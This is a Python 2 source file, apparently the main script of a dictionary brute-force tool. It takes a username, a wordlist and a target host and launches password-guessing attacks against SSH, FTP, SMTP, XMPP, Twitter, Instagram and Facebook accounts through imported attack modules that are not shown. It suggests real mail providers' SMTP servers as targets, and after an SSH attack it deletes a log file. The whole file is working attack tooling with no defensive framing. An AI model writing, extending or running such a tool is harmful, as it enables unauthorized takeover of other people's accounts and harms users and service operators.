#!/usr/bin/python
import pip, os, socket
from time import sleep
from sys import exit, path
from subprocess import call

path.append('src/')
from sshLib import *
from ftpLib import *
from smtpLib import *
from twitterLib import *
from instagramLib import *
from xmppLib import *
from facebookLib import *

W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[36m'  # cyan
GR = '\033[37m'  # gray


try:
    import argparse
    import selenium
    import paramiko
    import xmpp
    import fbchat
except ImportError:
    print R + "You are missing dependencies! They will be installed for you with pip." + W
    print "Loading..."
    sleep(3)
    pip.main(["install", "argparse", "selenium", "paramiko", "xmpppy", "fbchat"])

def get_args():

    parser = argparse.ArgumentParser(description='Server-side bruteforce module written in Python')
    required = parser.add_argument_group('required arguments')
    required.add_argument('-s', '--service', dest='service', help="Provide a service being attacked. Several protocols and services are supported")
    required.add_argument('-u', '--username', dest='username', help='Provide a valid username for service/protocol being executed')
    required.add_argument('-w', '--wordlist', dest='password', help='Provide a wordlist or directory to a wordlist')
    parser.add_argument('-a', '--address', dest='address', help='Provide host address for specified service. Required for certain protocols')
    parser.add_argument('-p', '--port', type=int, dest='port', help='Provide port for host address for specified service. If not specified, will be automatically set')
    parser.add_argument('-d', '--delay', type=int, dest='delay', help='Provide the number of seconds the program delays as each password is tried')

    args = parser.parse_args()

    man_options = ['username', 'password']
    for m in man_options:
        if not args.__dict__[m]:
            print R + "[!] You have to specify a username AND a wordlist! [!]" + W
            exit()

    service = args.service
    username = args.username
    wordlist = args.password
    address = args.address
    port = args.port
    delay = args.delay

    if delay is None:
        delay = 1


    return service, username, wordlist, address, port, delay



def main():

    service, username, wordlist, address, port, delay = get_args()


    print G + "[*] Username: %s " % username
    sleep(0.5)
    print G + "[*] Wordlist: %s " % wordlist
    sleep(0.5)
    if os.path.exists(wordlist) == False:
        print R + "[!] Wordlist not found! [!]" + W
        exit()
    print C + "[*] Service: %s "  % service + W
    sleep(0.5)

    # SSH bruteforce
    if service == 'ssh':
        if address is None:
            print R + "[!] You need to provide a SSH address for cracking! [!]" + W
            exit()
        print C + "[*] Address: %s" % address + W
        sleep(0.5)
        ####
        if port is None:
            print O + "[?] Port not set. Automatically set to 22 for you [?]" + W
            port = 22

        print C + "[*] Port: %s "  % port + W
        sleep(1)
        print P + "[*] Starting dictionary attack! [*]" + W
        print "Using %s seconds of delay. Default is 1 second" % delay
        sshBruteforce(address, username, wordlist, port, delay)
        call(["rm", "filename.log"])

    # FTP bruteforce
    elif service == 'ftp':
        if address is None:
            print R + "[!] You need to provide a FTP address for cracking! [!]" + W
        print C + "[*] Address: %s" % address + W
        sleep(0.5)
        if port is None:
            print O + "[?] Port not set. Automatically set to 21 for you [?]" + W
            port = 21
        print C + "[*] Port: %s "  % port + W
        sleep(1)
        print P + "[*] Starting dictionary attack! [*]" + W
        print "Using %s seconds of delay. Default is 1 second" % delay
        ftpBruteforce(address, username, wordlist, delay, port)

    elif service == 'smtp':
        if address is None:
            print R + "[!] You need to provide an SMTP server address for cracking! [!]" + W
            print O + "| Gmail: smtp.gmail.com |\n| Outlook: smtp.live.com |\n| Yahoo Mail: smtp.mail.yahoo.com |\n| AOL: smtp.aol.com | " + W
        print C + "[*] SMTP server: %s" % address + W
        sleep(0.5)
        if port is None:
            print O + "[?] Port not set. Automatically set to 587 for you [?]"
            print O + "[?] NOTE: SMTP has several ports for usage, including 25, 465, 587" + W
            port = 587
        print C + "[*] Port: %s "  % port + W
        sleep(1)
        print P + "[*] Starting dictionary attack! [*]" + W
        print "Using %s seconds of delay. Default is 1 second" % delay
        smtpBruteforce(address, username, wordlist, delay, port)

    elif service == 'xmpp':
        if address is None:
            print R + "[!] NOTE: You need to include a server address for cracking XMPP [!]" + W
            print O + "| For example: cypherpunks.it | inbox.im | creep.im |" + W
        print C + "[*] XMPP server: %s" % address + W
        sleep(0.5)
        if port is None:
            print O + "[?] Port not set. Automatically set to 5222 for you [?]"
            port = 5222
        print C + "[*] Port: %s "  % port + W
        sleep(1)
        print P + "[*] Starting dictionary attack! [*]" + W
        print "Using %s seconds of delay. Default is 1 second" % delay
        xmppBruteforce(address, port, username, wordlist, delay)

    elif service == 'twitter':
        if address or port:
            print R + "[!] NOTE: You don't need to provide an address OR port for Twitter (LOL) [!]" + W
            exit()
        print P + "[*] Checking if username exists..." + W
        if twitUserCheck(username) == 1:
            print R + "[!] The username was not found! Exiting..." + W
            exit()
        print G + "[*] Username found! Continuing..." + W
        sleep(1)
        twitterBruteforce(username, wordlist, delay)

    elif service == 'instagram':
        if address or port:
            print R + "[!] NOTE: You don't need to provide an address OR port for Instagram (LOL) [!]" + W
            exit()
        print P + "[*] Checking if username exists..." + W
        if instUserCheck(username) == 1:
            print R + "[!] The username was not found! Exiting..." + W
            exit()
        print G + "[*] Username found! Continuing..." + W
        sleep(1)
        print P + "[*] Starting dictionary attack! [*]" + W
        print "Using %s seconds of delay. Default is 1 second" % delay
        instagramBruteforce(username, wordlist, delay)

    elif service == 'facebook':
        print O + "[*] This Facebook bruteforce module is experimental. You will need to provide a Facebook ID instead of a username. Sorry! [*]" + W
        sleep(2)
        if address or port:
            print R + "[!] NOTE: You dont need to provide an address OR port for Facebook (LOL) [!]"
            exit()
        print P + "[*] Starting dictionary attack! [*]" + W
        print "Using %s seconds of delay. Default is 1 second" % delay
        facebookBruteforce(username, wordlist, delay)

if __name__ == '__main__':
    main()
